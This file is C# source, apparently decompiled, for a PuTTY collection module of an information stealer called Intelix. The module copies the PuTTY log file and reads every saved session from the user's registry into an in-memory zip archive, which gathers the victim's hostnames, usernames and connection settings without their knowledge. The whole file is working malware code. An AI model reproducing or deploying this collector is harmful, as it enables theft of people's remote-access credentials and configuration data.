using System;
using System.IO;
using System.Linq;
using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200004E RID: 78
	public class PuTTY : ITarget
	{
		// Token: 0x060000FC RID: 252 RVA: 0x0000E844 File Offset: 0x0000CA44
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "PuTTY";
			this.Logs(zip, counterApplications);
			this.Sessions(zip, counterApplications);
			bool flag = counterApplications.Files.Count > 0;
			if (flag)
			{
				counterApplications.Files.Add("PuTTY\\");
				counter.Applications.Add(counterApplications);
			}
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000E8A8 File Offset: 0x0000CAA8
		private void Logs(InMemoryZip zip, Counter.CounterApplications counterApplications)
		{
			string text = "C:\\Program Files\\PuTTY\\putty.log";
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = "PuTTY\\putty.log";
				zip.AddFile(text2, File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000E8F4 File Offset: 0x0000CAF4
		private void Sessions(InMemoryZip zip, Counter.CounterApplications counterApplications)
		{
			string text = "Software\\SimonTatham\\PuTTY\\Sessions";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, false))
			{
				bool flag = registryKey == null;
				if (!flag)
				{
					string[] array = registryKey.GetSubKeyNames().OrderBy((string x) => x, StringComparer.OrdinalIgnoreCase).ToArray<string>();
					bool flag2 = array.Length == 0;
					if (!flag2)
					{
						string[] array2 = array;
						foreach (string text2 in array2)
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(text2, false))
							{
								bool flag3 = registryKey2 != null;
								if (flag3)
								{
									string text3 = "PuTTY\\session_" + text2 + ".txt";
									string text4 = string.Join("\n", RegistryParser.ParseKey(registryKey2));
									zip.AddTextFile(text3, text4);
									counterApplications.Files.Add(string.Concat(new string[]
									{
										text,
										"\\",
										text2,
										" => ",
										text3
									}));
								}
							}
						}
					}
				}
			}
		}
	}
}
